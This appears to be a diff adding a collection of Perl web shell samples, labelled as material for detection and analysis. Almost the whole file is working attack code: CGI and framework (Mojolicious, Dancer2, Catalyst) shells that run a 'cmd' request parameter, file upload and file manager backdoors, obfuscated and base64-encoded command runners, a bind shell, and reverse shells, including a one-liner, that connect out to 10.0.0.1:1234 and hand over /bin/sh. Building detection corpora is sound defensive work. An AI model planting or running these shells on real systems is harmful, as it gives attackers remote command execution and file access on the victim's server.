@@ -1,0 +1,269 @@
+# Perl Web Shells
+# Perl web shell samples for detection and analysis
+
+# Basic Perl Shell
+#!/usr/bin/perl
+use CGI;
+my $q = CGI->new;
+print $q->header;
+print `$q->param('cmd')`;
+
+# Perl System Shell
+#!/usr/bin/perl
+system($ARGV[0]);
+
+# Perl Backtick Shell
+#!/usr/bin/perl
+print `$ARGV[0]`;
+
+# Perl Exec Shell
+#!/usr/bin/perl
+exec($ARGV[0]);
+
+# Perl Open Shell
+#!/usr/bin/perl
+open(CMD, "$ARGV[0] |");
+while(<CMD>){ print; }
+
+# Perl CGI Shell
+#!/usr/bin/perl
+use CGI;
+my $cgi = CGI->new;
+print $cgi->header('text/html');
+my $cmd = $cgi->param('cmd');
+my $output = `$cmd`;
+print "<pre>$output</pre>";
+
+# Perl Reverse Shell
+#!/usr/bin/perl
+use Socket;
+$i="10.0.0.1";
+$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/sh -i");
+};
+
+# Perl Bind Shell
+#!/usr/bin/perl
+use Socket;
+$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+bind(S,sockaddr_in($p,INADDR_ANY));
+listen(S,1);
+accept(C,S);
+open(STDIN,">&C");
+open(STDOUT,">&C");
+open(STDERR,">&C");
+exec("/bin/sh -i");
+
+# Perl One-liner Reverse Shell
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Perl File Upload Shell
+#!/usr/bin/perl
+use CGI;
+my $q = CGI->new;
+print $q->header;
+my $file = $q->param('file');
+my $filename = $q->param('filename');
+open(OUT, ">$filename");
+while(read($file, my $buffer, 1024)){
+    print OUT $buffer;
+}
+close(OUT);
+
+# Perl File Manager Shell
+#!/usr/bin/perl
+use CGI;
+my $q = CGI->new;
+print $q->header;
+if($q->param('dir')){
+    opendir(DIR, $q->param('dir'));
+    my @files = readdir(DIR);
+    closedir(DIR);
+    foreach(@files){ print "$_<br>"; }
+}
+if($q->param('read')){
+    open(FILE, $q->param('read'));
+    while(<FILE>){ print; }
+    close(FILE);
+}
+if($q->param('write')){
+    open(FILE, ">".$q->param('file'));
+    print FILE $q->param('content');
+    close(FILE);
+}
+
+# Perl Eval Shell
+#!/usr/bin/perl
+eval($ARGV[0]);
+
+# Perl Do Shell
+#!/usr/bin/perl
+do $ARGV[0];
+
+# Perl Require Shell
+#!/usr/bin/perl
+require $ARGV[0];
+
+# Perl IPC::Open3 Shell
+#!/usr/bin/perl
+use IPC::Open3;
+my $pid = open3(\*IN, \*OUT, \*ERR, $ARGV[0]);
+while(<OUT>){ print; }
+
+# Perl IO::Socket Shell
+#!/usr/bin/perl
+use IO::Socket;
+my $sock = IO::Socket::INET->new(
+    PeerAddr => '10.0.0.1',
+    PeerPort => 1234,
+    Proto => 'tcp'
+);
+print $sock "GET / HTTP/1.0\r\n\r\n";
+while(<$sock>){ print; }
+
+# Perl LWP Shell
+#!/usr/bin/perl
+use LWP::UserAgent;
+my $ua = LWP::UserAgent->new;
+my $response = $ua->get($ARGV[0]);
+print $response->content;
+
+# Perl DBI Shell
+#!/usr/bin/perl
+use DBI;
+my $dbh = DBI->connect("DBI:mysql:database=test;host=localhost", "root", "password");
+my $sth = $dbh->prepare($ARGV[0]);
+$sth->execute();
+while(my @row = $sth->fetchrow_array){
+    print "@row\n";
+}
+
+# Perl Obfuscated Shell
+#!/usr/bin/perl
+$_=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
+&$_($ARGV[0]);
+
+# Perl Base64 Shell
+#!/usr/bin/perl
+use MIME::Base64;
+my $cmd = decode_base64($ARGV[0]);
+system($cmd);
+
+# Perl Fork Shell
+#!/usr/bin/perl
+if(fork()==0){
+    system($ARGV[0]);
+    exit;
+}
+
+# Perl Thread Shell
+#!/usr/bin/perl
+use threads;
+threads->create(sub{ system($ARGV[0]); })->join;
+
+# Perl Pipe Shell
+#!/usr/bin/perl
+open(PIPE, "$ARGV[0] |");
+print while <PIPE>;
+close(PIPE);
+
+# Perl Glob Shell
+#!/usr/bin/perl
+my @files = glob($ARGV[0]);
+print "@files\n";
+
+# Perl Regex Shell
+#!/usr/bin/perl
+my $cmd = $ARGV[0];
+$cmd =~ s/(.*)/$1/e;
+
+# Perl Symbolic Reference Shell
+#!/usr/bin/perl
+my $cmd = 'system';
+&{$cmd}($ARGV[0]);
+
+# Perl Typeglob Shell
+#!/usr/bin/perl
+*cmd = \&system;
+cmd($ARGV[0]);
+
+# Perl AUTOLOAD Shell
+#!/usr/bin/perl
+sub AUTOLOAD{
+    system($ARGV[0]);
+}
+anything();
+
+# Perl Tie Shell
+#!/usr/bin/perl
+package Shell;
+sub TIESCALAR{ bless {}, shift; }
+sub FETCH{ system($ARGV[0]); }
+package main;
+tie my $shell, 'Shell';
+my $x = $shell;
+
+# Perl Overload Shell
+#!/usr/bin/perl
+package Shell;
+use overload '""' => sub{ system($ARGV[0]); };
+sub new{ bless {}, shift; }
+package main;
+my $shell = Shell->new;
+print "$shell";
+
+# Perl Source Filter Shell
+#!/usr/bin/perl
+use Filter::Simple;
+FILTER{ system($ARGV[0]); };
+
+# Perl Inline C Shell
+#!/usr/bin/perl
+use Inline C => 'void shell(char* cmd){ system(cmd); }';
+shell($ARGV[0]);
+
+# Perl XS Shell
+#!/usr/bin/perl
+use XSLoader;
+XSLoader::load('Shell');
+shell($ARGV[0]);
+
+# Perl Moose Shell
+#!/usr/bin/perl
+use Moose;
+has 'cmd' => (is => 'rw', trigger => sub{ system($_[1]); });
+__PACKAGE__->new(cmd => $ARGV[0]);
+
+# Perl Mojo Shell
+#!/usr/bin/perl
+use Mojolicious::Lite;
+get '/' => sub{
+    my $c = shift;
+    my $cmd = $c->param('cmd');
+    $c->render(text => `$cmd`);
+};
+app->start;
+
+# Perl Dancer Shell
+#!/usr/bin/perl
+use Dancer2;
+get '/' => sub{
+    my $cmd = param('cmd');
+    return `$cmd`;
+};
+start;
+
+# Perl Catalyst Shell
+#!/usr/bin/perl
+use Catalyst;
+sub index :Path :Args(0){
+    my ($self, $c) = @_;
+    my $cmd = $c->req->param('cmd');
+    $c->response->body(`$cmd`);
+}
